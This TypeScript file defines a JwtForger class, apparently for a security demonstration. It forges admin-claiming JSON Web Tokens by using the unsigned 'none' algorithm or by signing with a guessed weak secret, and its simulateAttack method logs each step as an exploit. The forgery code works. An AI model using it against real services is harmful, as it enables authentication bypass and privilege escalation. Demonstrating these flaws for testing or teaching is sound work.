import jwt from 'jsonwebtoken';

export class JwtForger {
  /**
   * Attempts to forge a token with the 'none' algorithm.
   */
  static forgeNoneAlgorithm(payload: object): string {
    // We manually construct the token because some libs block signing with 'none'
    const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
    const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
    return `${header}.${body}.`;
  }

  /**
   * Attempts to forge a token with a weak secret.
   */
  static forgeWeakSecret(payload: object, secret: string): string {
    return jwt.sign(payload, secret);
  }

  static async simulateAttack(vulnType: 'NONE' | 'WEAK_SECRET', secret?: string) {
    const adminPayload = { role: 'admin', user: 'hacker' };
    
    console.log(`\nüïµÔ∏è‚Äç‚ôÄÔ∏è [Exploit] Attempting to forge admin token...`);
    
    let token = '';
    if (vulnType === 'NONE') {
        token = this.forgeNoneAlgorithm(adminPayload);
        console.log(`üî® [Exploit] Forged 'none' alg token:`);
    } else if (vulnType === 'WEAK_SECRET' && secret) {
        token = this.forgeWeakSecret(adminPayload, secret);
        console.log(`üî® [Exploit] Forged token using weak secret "${secret}":`);
    }

    console.log(`   ${token.substring(0, 50)}...`);
    console.log(`‚úÖ [Exploit] Token forged! This token claims to be role: 'admin'.`);
    return token;
  }
}
